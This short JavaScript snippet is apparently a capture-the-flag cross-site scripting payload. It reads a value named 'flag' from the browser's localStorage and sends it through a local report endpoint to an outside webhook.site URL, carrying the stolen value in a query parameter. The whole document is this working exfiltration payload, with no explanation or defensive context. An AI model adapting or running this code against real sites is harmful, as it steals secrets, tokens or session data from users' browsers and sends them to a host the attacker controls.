var flag = window.localStorage.getItem('flag');
fetch('http://127.0.0.1:9007/report?url=https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f/?data=' + encodeURIComponent(flag));
